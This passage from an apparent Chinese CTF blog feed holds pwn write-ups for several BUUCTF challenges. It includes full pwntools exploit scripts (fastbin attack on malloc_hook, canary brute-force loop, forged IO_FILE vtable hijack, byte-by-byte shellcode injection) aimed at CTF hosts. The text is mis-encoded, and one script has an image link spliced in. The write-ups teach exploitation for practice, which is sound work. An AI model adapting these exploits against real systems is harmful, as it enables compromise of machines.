oneçš„æ¼æ´(ç¬¬ä¸€æ¬¡è¾“å…¥ä¸€ä¸ªè¶…è¿‡sizeçš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒæ¬¡å†editä¸€æ¬¡ï¼Œå°±å¯ä»¥è§¦å‘off by one)ï¼Œæ‰“ä¸€ä¸ªå †å—é‡å åŠ fastbin attackã€‚å› ä¸ºæ˜¯é™æ€é“¾æ¥ï¼Œæ‰€ä»¥malloc_hookæ˜¯åœ¨dataæ®µä¸Šï¼Œåˆæ²¡å¼€PIEï¼Œæ‰€ä»¥fastbin attackå°±å¯ä»¥ç›´æ¥åŠ«æŒfdçš„ä½ç½®ä¸ºmalloc_hookã€‚ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œæ”¹æˆmalloc_hook-0x16å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261551786.png" alt="image-20221126155133663" style="zoom:50%;" /><p>æœ€ç»ˆå°†malloc_hooké‡Œå†™å…¥malloc_hook+8åé¢ç´§è·Ÿshellcodeå³å¯</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26161&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Note:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Index of Note:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Index of Note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Note:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x29</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;iiii&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;prevent merge&#x27;</span>)</span><br><span class="line"><span class="comment">#0x6CB788</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+<span class="string">b&#x27;\xa1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0x6CB788</span>-<span class="number">0x16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="number">0x400EB9</span>,<span class="number">0x400ECA</span>,<span class="number">0x400EA8</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span>+p64(<span class="number">0x6CB788</span>+<span class="number">8</span>)+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input the Size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261554595.png" alt="image-20221126155434205"></p><h2 id="picoctf-2018-buffer-overflow-3"><a href="#picoctf-2018-buffer-overflow-3" class="headerlink" title="picoctf_2018_buffer overflow 3"></a>picoctf_2018_buffer overflow 3</h2><p>æœ¬é¢˜ä»¥ <code>ssh</code> ç™»å½•ï¼Œæ— æ³•ç›´æ¥å»æ‰“è¿œç¨‹ï¼Œè€Œæ˜¯ç™»å½•è¿œç¨‹æœåŠ¡å™¨ï¼Œæ¥æ‰“çš„æœ¬åœ°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æœ¬åœ°ä¹Ÿæ²¡æœ‰ <code>pwntools</code> ï¼Œæ‰€ä»¥æ— æ³•ç”¨ <code>py</code> è„šæœ¬æ¥æ‰“ã€‚</p><p>æœ¬é¢˜å°±æ˜¯è‡ªå·±å®ç°äº†ä¸€ä¸ªå››å­—èŠ‚çš„ <code>canary</code> (ä» <code>canary.txt</code> æ–‡ä»¶ä¸­è¯»å–çš„),ç„¶åæœ‰ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¹¶ä¸”ç»™äº†åé—¨å‡½æ•°è¯»å– <code>flag</code></p><p>å…³é”®ç‚¹å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041630782.png" alt="image-20230204163000453" style="zoom:50%;" /><p>ç¬¬ <code>21</code> è¡Œï¼Œå¯ä»¥å¾€ <code>buf</code> ç›´æ¥æº¢å‡ºï¼Œæ§åˆ¶ <code>s1</code> ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ <code>s1</code> æœ¬æ¥çš„æ•°æ®å­˜æ”¾çš„å°±æ˜¯ <code>canary</code> ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å…ˆè¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå› ä¸ºåé¢ä¸‰ä¸ªå­—ç¬¦ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼ˆä¸è¦†ç›–çš„è¯ï¼‰ï¼Œå¦‚æœè¿™ä¸ªå­—ç¬¦æ­£ç¡®ï¼Œå°±å¯ä»¥é€šè¿‡æ£€æŸ¥ï¼Œä»è€Œå®ç° <code>canary</code>  ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„æ¯”å¯¹ã€‚</p><p>å› æ­¤è¿™é‡Œçš„æˆ‘ä»¬ <code>ssh</code> ç™»å½•ä¸Šåï¼Œç”¨è¿™ä¸ª <code>shell</code> å‘½ä»¤ </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in &#123;0..255&#125;; do python -c &quot;print \&quot;33\\n\&quot; + \&quot;U\&quot;*32 + chr($i)&quot; | ./vuln &gt;/dev/null &amp;&amp; echo &quot;$i&quot;; done</span><br></pre></td></tr></table></figure><p>æ¥å°† <code>canary</code> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ¥çˆ†ç ´å‡ºæ¥ï¼Œä¸€æ¬¡ç±»æ¨è¿›è¡Œé€ä½çˆ†ç ´ï¼Œå…·ä½“è€Œè¨€ï¼Œå¾ªç¯è¯­å¥ <code>for i in &#123;0..255&#125;</code> å°† <code>$i$</code> ä» <code>0</code> åˆ° <code>255</code> ä¾æ¬¡è®¾ç½®ä¸ºå˜é‡ã€‚å¯¹äºæ¯ä¸€æ¬¡è¿­ä»£ï¼Œè¯¥å‘½ä»¤éƒ½ä½¿ç”¨ <code>python</code> è§£é‡Šå™¨æ‰§è¡Œä»¥ä¸‹è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perlCopy code</span><br><span class="line">print &quot;33\n&quot; + &quot;U&quot;*32 + chr($i)</span><br></pre></td></tr></table></figure><p>è¯¥è„šæœ¬æ‰“å°äº†å­—ç¬¦ä¸² â€œ33\nâ€ï¼Œç„¶åä½¿ç”¨é‡å¤å­—ç¬¦ â€œUâ€ çš„å­—ç¬¦ä¸²ï¼ˆé•¿åº¦ä¸º 32ï¼‰è¿æ¥ä¸Š ASCII ç ä¸º $i çš„å­—ç¬¦ï¼Œæœ€åé€šè¿‡ç®¡é“ç¬¦ï¼ˆ|ï¼‰å°†è¾“å‡ºé‡å®šå‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶ <code>./vuln</code>ã€‚è¾“å‡ºçš„å†…å®¹è¢«é‡å®šå‘åˆ° <code>/dev/null</code>ï¼Œä»¥é¿å…åœ¨å±å¹•ä¸Šæ˜¾ç¤ºã€‚</p><p>å¦‚æœæ‰§è¡Œ <code>./vuln</code> ç¨‹åºçš„é€€å‡ºä»£ç ä¸ºé›¶ï¼Œåˆ™è¡¨æ˜ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œå¹¶ä½¿ç”¨å‘½ä»¤ <code>echo &quot;$i&quot;</code> å°†å½“å‰ $i çš„å€¼æ‰“å°åˆ°å±å¹•ä¸Šã€‚</p><p>ä¾æ¬¡ç±»æ¨å°†æ¯ä¸€ä½çš„ <code>canary</code> éƒ½çˆ†ç ´å‡ºæ¥ ï¼Œå› ä¸ºé¢˜ç›®ç»™äº†åé—¨å‡½æ•°ï¼Œå› æ­¤æœ€åè¿”å›åœ°å€å¡«å……æˆåé—¨å‡½æ•°çš„åœ°å€å³å¯</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302050918794.png" alt="image-20230205091810320"></p><h2 id="pwnable-seethefile"><a href="#pwnable-seethefile" class="headerlink" title="pwnable_seethefile"></a>pwnable_seethefile</h2><p>è¿™é¢˜æˆ‘æ˜¯çœŸçš„çƒ¦ï¼Œè¿™é¢˜çš„ <code>_IO_file_close</code> å’Œ <code>_IO_new_file_finish</code> éƒ½å¯ä»¥åŠ«æŒï¼Œå› ä¸ºæˆ‘è°ƒè¯•çš„æ—¶å€™æ˜¯å…ˆçœ‹è§¦å‘äº† <code>_IO_file_close</code> ,æ‰€ä»¥å°±æƒ³ç€æ¥æ‰“è¿™ä¸ªã€‚æŒ‰ç†è¯´åªè¦æ£€æŸ¥ç»•è¿‡äº†èƒ½è§¦å‘ï¼ŒåŠ«æŒ<code>vtable</code> ä¹‹åæ‰“å“ªä¸ªéƒ½ä¸€æ ·ï¼Œä½†æ˜¯æˆ‘æ‰“ <code>_IO_file_close</code> è¿œç¨‹æ­»æ´»ä¸é€šï¼ˆæœ¬åœ°æ˜¯èƒ½é€šçš„ï¼‰  ç„¶åç½‘ä¸Šä¸€æœ <code>wp</code> å‘ç°å…¨æ‰“çš„æ˜¯ <code>_IO_new_file_finish</code> , æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥éƒ½ä¼šæƒ³ç€å»æ‰“è¿™ä¸ªä½äºåé¢çš„å‡½æ•°æŒ‡é’ˆâ€¦</p><p>æœ‰ä¸ªé™¤äº† <code>flag</code> æ–‡ä»¶çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ‰€ä»¥ç›´æ¥å»è¯» <code>/proc/self/maps</code> æ–‡ä»¶è·å– <code>libc</code> åœ°å€ï¼Œç„¶åæœ‰ä¸ªå¾ˆæ˜æ˜¾çš„ç¯¡æ”¹æ–‡ä»¶æŒ‡é’ˆçš„æ¼æ´ï¼Œå°±ä¼ªé€ ä¸€ä¸ª <code>IO_FILE</code> ç„¶åæ§åˆ¶ <code>vtable</code> ï¼Œæ€»ä¹‹è¿™é¢˜é™¤äº†é‚£ä¸ªè·å– <code>libc</code> åœ°å€çš„æ“ä½œæˆ‘æ˜¯ç¬¬ä¸€æ¬¡è§ä¹‹å¤–ï¼Œåé¢æ”»å‡» <code>IO</code> æµéƒ½æ˜¯å…¥é—¨æ“ä½œâ€¦ ä¸è¯´äº† è¶Šæƒ³è¶Šæ°”</p><p>è¿™é‡Œçš„ <code>exp</code> æ³¨é‡Šçš„éƒ¨åˆ†æ˜¯æˆ‘æœ€åˆæ‰“ <code>_IO_new_file_finish</code> çš„ <code>payload</code> ã€‚æœ¬é¢˜èƒ½æ‰“é€šï¼Œè¿œç¨‹ä¸è¡Œâ€¦  <strong>æ³¨æ„ï¼šè·å–çš„ <code>libc</code> åœ°å€ <code>+0x1000</code> æ‰æ˜¯ <code>libc</code> åŸºåœ°å€</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>,<span class="string">&quot;node4.buuoj.cn:25199&quot;</span>,<span class="string">&quot;/home/zikh/Desktop/buu32-libc-2.23.so&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineaft![image-<span class="number">20230208221017928</span>](C:/Users/<span class="number">86137</span>/AppData/Roaming/Typora/typora-user-images/image-<span class="number">20230208221017928.</span>png)er(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">heap_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+<span class="number">0x0003a940</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># vtable_addr=0xdeadbeef</span></span><br><span class="line"><span class="comment"># io_file_addr=0x804b284</span></span><br><span class="line"><span class="comment"># io_file=b&quot;/bin/sh;&quot;#_flags</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x0)*11</span></span><br><span class="line"><span class="comment"># io_file+=p32(libc_base+0x1d8ce0)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x3)#fileno</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x0)*3</span></span><br><span class="line"><span class="comment"># io_file+=p32(heap_base+0x1208)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0xffffffff)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0xdeadbeef)*17</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x804b2d8)</span></span><br><span class="line"><span class="comment"># io_file+=p32(sys_addr)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=p32(0xdeadbeef)*0x8</span></span><br><span class="line"><span class="comment"># payload+=p32(io_file_addr)</span></span><br><span class="line"><span class="comment"># payload+=io_file</span></span><br><span class="line"></span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)*<span class="number">0x8</span></span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">b&quot;;sh&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(sys_addr)*<span class="number">3</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302082210135.png" alt="image-20230208221024944"></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/">https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/</a></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_é¹åŸæ¯_2018_treasure</title>
      <link href="/posts/7bda138.html"/>
      <url>/posts/7bda138.html</url>
      
        <content type="html"><![CDATA[<p>è¿™é“é¢˜ä¸çŸ¥é“æˆ‘è¿™ä¸ªæ–¹æ³•ç®—ä¸ç®—éé¢„æœŸè§£ï¼Œä¸è¿‡åšå‡ºæ¥ä¹‹åçœ‹å…¶ä»–å¸ˆå‚…ä»¬çš„wpæ„Ÿè§‰è‡ªå·±çš„æ–¹æ³•å¼±çˆ†äº†ï¼Œä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹è¿™é“é¢˜ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><img src="https://s2.loli.net/2022/07/22/yK5XANsVgEDZTJU.png" alt="image-20220722114127886" style="zoom:50%;" /><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><img src="https://s2.loli.net/2022/07/22/NJDx2pEBTPcZl5X.png" alt="image-20220722114157199" style="zoom:50%;" /><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯å‡ºé¢˜äººå‡†å¤‡äº†ä¸€ä¸ªshellcodeï¼Œç„¶åæ”¾åˆ°äº†ä¸€ä¸ªéšæœºçš„ä½ç½®ã€‚ä½†æ˜¯è¿™ä¸ªshellcodeæ”¾åˆ°çš„è¿™ä¸ªä½ç½®æ˜¯ä¸å¯æ‰§è¡Œçš„â€¦ ä¸çŸ¥é“æœ‰å•¥æ„ä¹‰ï¼Œåæ­£æˆ‘æ„Ÿè§‰è¿™é“é¢˜è·Ÿè¿™ä¸ªå‡½æ•°æ²¡å…³ç³»ã€‚</p><img src="https://s2.loli.net/2022/07/22/yA34E6fTnPr19DF.png" alt="image-20220722114346426" style="zoom:50%;" /><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯å¯ä»¥è¾“å…¥ä¸€ä¸ª9å­—èŠ‚çš„å†…å®¹ï¼Œç„¶åå°†å…¶æ‰§è¡Œã€‚åªè¦ç¨‹åºä¸å´©æºƒï¼Œå¹¶ä¸”ä¸æ‰§è¡Œbreakã€‚é‚£å°±å¯ä»¥æ— é™é‡å¤è¿™äº›ä»£ç ã€‚</p><h2 id="å¤§è‡´æ€è·¯"><a href="#å¤§è‡´æ€è·¯" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h2><p>ç”±äºå‡ºé¢˜äººç»™çš„é‚£ä¸ªshellcodeä¹Ÿæ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥å°±ä¸è€ƒè™‘é‚£é‡Œäº†ã€‚ç„¶åæ¯æ¬¡åªèƒ½æ‰§è¡Œä¹å­—èŠ‚çš„æ•°æ®ï¼Œç›´æ¥å†™shellcodeè‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚æˆ‘ä»¬å…ˆåˆ°å‡½æ•°æŒ‡é’ˆé‚£é‡Œè°ƒè¯•ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µã€‚</p><p><img src="https://s2.loli.net/2022/07/22/9bEw5lF6gLaPjyr.png" alt="image-20220722114806036"></p><p>è°ƒè¯•å‘ç°ï¼Œå­˜åœ¨å¯å†™åŒæ—¶è¿˜å¯æ‰§è¡Œçš„å†…å­˜åªæœ‰0x7fffff7ff6000è¿™ä¸€æ®µå†…å­˜ã€‚é‚£ä¹ˆæ€è·¯è‚¯å®šæ˜¯æŠŠshellcodeå†™åˆ°è¿™ç‰‡å†…å­˜ï¼Œç„¶åå°†å…¶æ‰§è¡Œã€‚</p><p>ä½†æ˜¯è²Œä¼¼æ²¡æ³•ç”¨å‡½æ•°æ¥å†™shellcodeï¼Œç„¶åæˆ‘å°±è€ƒè™‘è‡ªå·±ç¼–å†™ä¸€æ®µæ±‡ç¼–ï¼Œç„¶åå°†shellcodeçš„æœºå™¨ç ä¸€å­—èŠ‚ä¸€å­—èŠ‚å†™åˆ°è¿™ç‰‡å†…å­˜ã€‚åŒæ—¶è§‚å¯Ÿæ­¤æ—¶çš„å¯„å­˜å™¨rdx(å¦‚ä¸‹å›¾)ï¼Œå‘ç°rdxçš„å€¼å°±æ˜¯å¯æ‰§è¡Œå†…å­˜çš„åœ°å€ã€‚</p><p><img src="https://s2.loli.net/2022/07/22/lhXn4tUZoL7qsxc.png" alt="image-20220722115221760"></p><p>ç„¶åæˆ‘ç¼–å†™äº†ä¸‹é¢è¿™æ®µæ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x48</span><br><span class="line">pop [rdx+0x20]</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>è¿™æ®µæ±‡ç¼–çš„æ„æ€å°±æ˜¯è¯´æŠŠ0x48å†™åˆ°rdx+0x20æŒ‡å‘çš„å†…å­˜ï¼Œç„¶åæ‰§è¡ŒretæŒ‡ä»¤ã€‚è¿™ä¸ª0x48ä¹Ÿå°±æ˜¯shellcodeçš„æœºå™¨ç ä¸­çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åä¸æ–­å¾ªç¯ï¼Œä¸‹æ¬¡å†™å…¥åˆ°[rdx+0x21]ï¼Œä¾æ¬¡ç±»æ¨ã€‚ä¹‹æ‰€ä»¥æˆ‘æ”¾åˆ°0x20å¤„ï¼Œæ˜¯ä¸ºäº†ä¸ç ´åæˆ‘ä»¬å†™å…¥çš„ä¹å­—èŠ‚æ•°æ®(åªè¦ä¸ç ´åä¹ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåç§»æ˜¯å¤šå°‘éƒ½å¯ä»¥)</p><p>shellcodeçš„æœºå™¨ç å¦‚ä¸‹  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">åœ¨çº¿æ±‡ç¼–è½¬æœºå™¨ç çš„ç½‘ç«™</a></p><p><img src="https://s2.loli.net/2022/07/22/WfsnwubMAOcr2zC.png" alt="image-20220722115739583"></p><p>ç„¶åå°±ç”¨ä¸Šé¢çš„æ–¹æ³•æŠŠè¿™ä¸ªshellcodeä¸€å­—èŠ‚ä¸€å­—èŠ‚çš„å†™å…¥ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œpush 0x48;pop [rdx+0x20];retçš„æ—¶å€™ï¼Œå°±è½¬æˆå¯¹åº”æœºå™¨ç </p><img src="https://s2.loli.net/2022/07/22/EyP2wMzqDeKXB8p.png" alt="image-20220722115953307" style="zoom:33%;" /><p>ç„¶åpayloadè¿™ä¹ˆå†™</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x20\xC3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡ç±»æ¨ï¼Œå°†shellcodeä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å†™å…¥å³å¯ã€‚</p><p>æœ€åå°†shellcodeå†™å®Œçš„æ—¶å€™ï¼Œæ‰§è¡Œä¸‹é¢çš„æ±‡ç¼–æŒ‡ä»¤(è½¬æˆæœºå™¨ç )è·³è½¬åˆ°shellcodeä¸Šå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rdx,0x20</span><br><span class="line">jmp rdx</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼Œæ­¤æ—¶jmp rdxå°±è·³è½¬åˆ°äº†æˆ‘å¸ƒç½®çš„shellcodeä¸Šäº†ã€‚</p><p><img src="https://s2.loli.net/2022/07/22/MxuyOCkr4jpRtPq.png" alt="image-20220722120527335"></p><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29220)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x20\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x58\x48\x89\x42\x21\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xC0\x00\x00\x00\x8F\x42\x22\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x6A\x8F\x42\x23\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x3B\x8F\x42\x24\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x58\x8F\x42\x25\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x26\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x27\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xFF\x00\x00\x00\x8F\x42\x28\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span 